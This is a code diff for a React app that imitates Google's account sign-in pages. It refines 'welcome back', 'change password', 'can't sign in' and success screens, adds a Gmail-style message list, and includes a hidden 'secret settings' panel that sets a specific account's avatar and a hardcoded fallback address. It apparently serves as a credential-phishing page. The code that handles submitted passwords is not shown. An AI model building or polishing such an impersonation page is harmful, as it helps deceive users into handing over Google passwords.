@@ -4,7 +4,7 @@ import { motion, AnimatePresence } from 'motion/react';
 import { initAuth, googleSignIn, logout, getAccessToken } from './auth';
 import type { User } from 'firebase/auth';
 import { translations, Language } from './translations';
-import { SecretAvatarPanel, CustomAvatarConfig } from './SecretAvatarPanel';
+import { SecretAvatarPanel, CustomAvatarConfig, GoogleDefaultAvatar } from './SecretAvatarPanel';
 
 const GoogleLogo = () => (
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
@@ -42,79 +42,90 @@ const getInitial = (str: string) => {
   return (clean[0] || 'U').toUpperCase();
 };
 
+export const GOOGLE_PROFILE_ASSET = '/assets/aistudio/IMG_3071_ec4fd47a.webp';
+
 const UserAvatar = ({
   photoURL,
   nameOrEmail,
   size = 32,
   className = '',
   customOverride,
+  forceDefaultIcon = false,
 }: {
   photoURL?: string | null;
   nameOrEmail?: string;
   size?: number;
   className?: string;
   customOverride?: CustomAvatarConfig;
+  forceDefaultIcon?: boolean;
 }) => {
   if (customOverride && customOverride.enabled) {
-    if (customOverride.photoURL) {
+    if (customOverride.avatarType === 'photo' && customOverride.photoURL) {
       return (
         <img
           src={customOverride.photoURL}
           alt="Profile"
-          className={`rounded-full object-cover flex-shrink-0 ${className}`}
+          className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
           style={{ width: `${size}px`, height: `${size}px` }}
           referrerPolicy="no-referrer"
         />
       );
     }
 
-    const initial = (customOverride.initial || 'U').trim().toUpperCase().slice(0, 2);
-    const bgColor = customOverride.bgColor || '#1a73e8';
-    const fontSize = Math.max(10, Math.round(size * 0.5));
+    if (customOverride.avatarType === 'letter') {
+      const initial = (customOverride.initial || 'R').trim().toUpperCase().slice(0, 2);
+      const bgColor = customOverride.bgColor || '#1a73e8';
+      const fontSize = Math.max(10, Math.round(size * 0.5));
 
-    return (
-      <div
-        className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
-        style={{
-          width: `${size}px`,
-          height: `${size}px`,
-          backgroundColor: bgColor,
-          fontSize: `${fontSize}px`,
-        }}
-      >
-        {initial}
-      </div>
-    );
+      return (
+        <div
+          className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
+          style={{
+            width: `${size}px`,
+            height: `${size}px`,
+            backgroundColor: bgColor,
+            fontSize: `${fontSize}px`,
+          }}
+        >
+          {initial}
+        </div>
+      );
+    }
+
+    if (customOverride.avatarType === 'icon') {
+      return (
+        <img
+          src={GOOGLE_PROFILE_ASSET}
+          alt="Profile"
+          className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
+          style={{ width: `${size}px`, height: `${size}px` }}
+          referrerPolicy="no-referrer"
+        />
+      );
+    }
   }
 
-  if (photoURL) {
+  if (photoURL && !forceDefaultIcon) {
     return (
       <img
         src={photoURL}
         alt="Profile"
-        className={`rounded-full object-cover flex-shrink-0 ${className}`}
+        className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
         style={{ width: `${size}px`, height: `${size}px` }}
         referrerPolicy="no-referrer"
       />
     );
   }
 
-  const initial = getInitial(nameOrEmail || '');
-  const bgColor = getAvatarColor(nameOrEmail || 'user');
-  const fontSize = Math.max(10, Math.round(size * 0.5));
-
+  // Exact Google Profile Image from user upload /assets/aistudio/IMG_3071_ec4fd47a.webp
   return (
-    <div
-      className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
-      style={{
-        width: `${size}px`,
-        height: `${size}px`,
-        backgroundColor: bgColor,
-        fontSize: `${fontSize}px`,
-      }}
-    >
-      {initial}
-    </div>
+    <img
+      src={GOOGLE_PROFILE_ASSET}
+      alt="Profile"
+      className={`rounded-full object-cover flex-shrink-0 select-none ${className}`}
+      style={{ width: `${size}px`, height: `${size}px` }}
+      referrerPolicy="no-referrer"
+    />
   );
 };
 
@@ -849,7 +860,7 @@ export default function App() {
         </footer>
 
         {/* Secret Feature Area at bottom of checkup page (Scroll down) */}
-        <div className="w-full flex flex-col items-center mt-[100vh] sm:mt-[120vh] mb-24 px-4">
+        <div className="w-full flex flex-col items-center my-24 px-4">
           <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
             <span className="w-12 h-px bg-gray-200"></span>
             <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
@@ -868,7 +879,7 @@ export default function App() {
   }
 
   return (
-    <div className="min-h-screen bg-white sm:bg-[#f0f4f9] p-0 sm:p-5 flex flex-col items-center justify-between sm:justify-center font-sans tracking-wide relative">
+    <div className="min-h-screen bg-white sm:bg-[#f0f4f9] flex flex-col items-center font-sans tracking-wide relative overflow-x-hidden">
       
       {/* Full-screen Loading Overlay for background */}
       <AnimatePresence>
@@ -883,7 +894,11 @@ export default function App() {
         )}
       </AnimatePresence>
 
-      <div className="bg-white sm:rounded-[28px] w-full sm:max-w-[448px] sm:min-h-[500px] flex flex-col sm:h-auto sm:border sm:border-gray-200 flex-grow sm:flex-grow-0 overflow-x-hidden relative z-50 shadow-sm">
+      {/* Primary Google Login Viewport - exactly 100dvh min-height on mobile */}
+      <div className="w-full min-h-[100dvh] flex flex-col justify-between items-center p-0 sm:p-5 sm:justify-center">
+        
+        {/* Main Login Card */}
+        <div className="bg-white sm:rounded-[28px] w-full sm:max-w-[448px] sm:min-h-[500px] flex flex-col flex-1 sm:flex-initial sm:h-auto sm:border sm:border-gray-200 overflow-x-hidden relative z-10 sm:shadow-sm">
         
         {/* Loading Overlay inside the form box */}
         <AnimatePresence>
@@ -946,7 +961,7 @@ export default function App() {
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.welcomeBackTitle}</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
                       style={{ textDecoration: 'none' }}
                     >
                       <UserAvatar
@@ -955,8 +970,12 @@ export default function App() {
                         nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                         size={20}
                       />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
+                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
+                        {email || 'rukho977@gmail.com'}
+                      </span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
+                        <path d="M7 10l5 5 5-5z"/>
+                      </svg>
                     </div>
                   </>
                 )}
@@ -965,7 +984,7 @@ export default function App() {
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.changePasswordTitle}</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
                       style={{ textDecoration: 'none' }}
                     >
                       <UserAvatar
@@ -974,8 +993,12 @@ export default function App() {
                         nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                         size={20}
                       />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
+                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
+                        {email || 'rukho977@gmail.com'}
+                      </span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
+                        <path d="M7 10l5 5 5-5z"/>
+                      </svg>
                     </div>
                   </>
                 )}
@@ -984,7 +1007,7 @@ export default function App() {
                     <h1 className="text-[32px] sm:text-[36px] text-[#1f1f1f] font-normal mb-1.5 mt-4 leading-tight">{t.successTitle}</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
                       style={{ textDecoration: 'none' }}
                     >
                       <UserAvatar
@@ -993,8 +1016,12 @@ export default function App() {
                         nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                         size={20}
                       />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email || 'user@gmail.com'}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
+                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
+                        {email || 'rukho977@gmail.com'}
+                      </span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
+                        <path d="M7 10l5 5 5-5z"/>
+                      </svg>
                     </div>
                   </>
                 )}
@@ -1009,7 +1036,7 @@ export default function App() {
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.cantSignInTitle}</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[12px] mt-2 inline-flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max max-w-full`}
                       style={{ textDecoration: 'none' }}
                     >
                       <UserAvatar
@@ -1018,15 +1045,19 @@ export default function App() {
                         nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                         size={20}
                       />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
+                      <span className="no-underline decoration-none truncate leading-none text-[14px] font-medium text-[#1f1f1f] pt-[0.5px]" style={{ textDecoration: 'none', borderBottom: 'none' }}>
+                        {email || 'rukho977@gmail.com'}
+                      </span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[16px] h-[16px] text-[#1f1f1f] flex-shrink-0 ml-0.5">
+                        <path d="M7 10l5 5 5-5z"/>
+                      </svg>
                     </div>
                   </>
                 )}
               </div>
 
         {/* Content/Form Section */}
-        <div className="px-6 pb-10 flex flex-col flex-grow sm:px-10">
+        <div className="px-6 pb-4 sm:px-10 sm:pb-8 flex flex-col flex-grow">
           {step === 'email' && (
             <form onSubmit={handleEmailSubmit} className="flex flex-col flex-grow justify-between">
               <div className="pt-2">
@@ -1053,19 +1084,19 @@ export default function App() {
                   </button>
                 </div>
 
-                <div className="mt-9 text-[14px] text-[#444746] leading-relaxed">
+                <div className="mt-8 sm:mt-9 text-[14px] text-[#444746] leading-relaxed">
                   <span>{t.guestModeText}</span>
                   <a
                     href="#"
                     onClick={(e) => e.preventDefault()}
-                    className="text-[#0b57d0] font-medium hover:underline inline"
+                    className="text-[#0b57d0] font-medium hover:underline inline ml-1"
                   >
                     {t.learnMoreGuestMode}
                   </a>
                 </div>
               </div>
 
-              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
+              <div className="mt-8 flex justify-between items-center pb-2 sm:pb-0">
                 <button
                   type="button"
                   className="text-[#0b57d0] hover:bg-blue-50/50 px-3 py-2 -ml-3 rounded-full font-medium text-[14px] transition"
@@ -1085,13 +1116,13 @@ export default function App() {
           )}
 
           {step === 'password' && (
-            <div className="flex flex-col flex-grow justify-start pt-6">
+            <div className="flex flex-col flex-grow justify-between pt-2">
               <div>
                 <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
                   {t.forgotPasswordNotice}
                 </p>
               </div>
-              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
+              <div className="mt-8 flex justify-between items-center pb-2 sm:pb-0">
                 <button
                   type="button"
                   onClick={() => changeStep('change_password', 1)}
@@ -1113,9 +1144,9 @@ export default function App() {
           )}
 
           {step === 'change_password' && (
-            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-start">
+            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-between">
               <div className="pt-2">
-                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">{t.createStrongPasswordHeading}</h2>
+                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-2 sm:mt-4 mb-1">{t.createStrongPasswordHeading}</h2>
                 <p className="text-[#444746] text-[14px] mb-6 leading-normal">
                   {t.createStrongPasswordDesc}
                 </p>
@@ -1167,7 +1198,7 @@ export default function App() {
                 </div>
               </div>
 
-              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
+              <div className="mt-8 flex justify-between items-center pb-2 sm:pb-0">
                 <button
                   type="button"
                   onClick={() => changeStep('error', 1)}
@@ -1242,9 +1273,15 @@ export default function App() {
                       return (
                         <div
                           key={idx}
-                          className="px-3.5 py-3 flex items-center gap-3 hover:bg-[#f8fafd] transition-colors cursor-pointer select-none"
+                          className="px-3.5 py-3 flex items-center gap-3.5 hover:bg-[#f8fafd] transition-colors cursor-pointer select-none"
                         >
-                          <UserAvatar nameOrEmail={from} size={32} />
+                          <UserAvatar
+                            customOverride={customAvatar}
+                            photoURL={googleUser?.photoURL}
+                            nameOrEmail={from}
+                            size={32}
+                            className="w-[32px] h-[32px] flex-shrink-0"
+                          />
                           <div className="flex-1 min-w-0 pr-1">
                             <div className="flex items-center justify-between gap-1">
                               <p className="font-medium text-[#1f1f1f] text-[13px] truncate">{from}</p>
@@ -1348,34 +1385,39 @@ export default function App() {
         </div>
       </div>
 
+      {/* Mobile Subtle Divider */}
+      <div className="w-full border-t border-[#f2f2f2] sm:hidden" />
+
       {/* Footer */}
-      <div className="w-full sm:max-w-[448px] px-6 pb-6 pt-2 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
+      <div className="w-full sm:max-w-[448px] px-6 py-3.5 sm:px-0 sm:pb-0 sm:pt-6 flex flex-col sm:flex-row justify-between text-[12px] text-[#444746] bg-white sm:bg-transparent">
         <div className="flex justify-start items-center">
           <LanguageSelector lang={lang} setLang={setLang} upward={true} />
         </div>
-        <div className="flex gap-4 sm:gap-6 mt-4 sm:mt-0 items-center justify-start sm:justify-end">
-          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 sm:-ml-0 rounded transition">{t.help}</a>
-          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.privacy}</a>
-          <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.terms}</a>
+        <div className="flex gap-4 sm:gap-6 mt-3 sm:mt-0 items-center justify-start sm:justify-end">
+          <a href="#" className="hover:text-[#1f1f1f] px-1 py-1 -ml-1 sm:ml-0 transition">{t.help}</a>
+          <a href="#" className="hover:text-[#1f1f1f] px-1 py-1 transition">{t.privacy}</a>
+          <a href="#" className="hover:text-[#1f1f1f] px-1 py-1 transition">{t.terms}</a>
         </div>
-      </div>
-
-      {/* Secret Feature Area at the very bottom of the main page (Scroll down) */}
-      <div className="w-full max-w-[480px] mt-[100vh] sm:mt-[140vh] mb-28 px-4 flex flex-col items-center">
-        <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
-          <span className="w-12 h-px bg-gray-200"></span>
-          <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
-          <span className="w-12 h-px bg-gray-200"></span>
-        </div>
-        <SecretAvatarPanel
-          config={customAvatar}
-          onChange={handleCustomAvatarChange}
-          email={email}
-          t={t}
-          lang={lang}
-        />
       </div>
 
     </div>
-  );
+
+    {/* Secret Feature Area at the very bottom of the main page (Scroll down) */}
+    <div className="w-full max-w-[480px] my-28 px-4 flex flex-col items-center">
+      <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
+        <span className="w-12 h-px bg-gray-200"></span>
+        <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
+        <span className="w-12 h-px bg-gray-200"></span>
+      </div>
+      <SecretAvatarPanel
+        config={customAvatar}
+        onChange={handleCustomAvatarChange}
+        email={email}
+        t={t}
+        lang={lang}
+      />
+    </div>
+
+  </div>
+);
 }
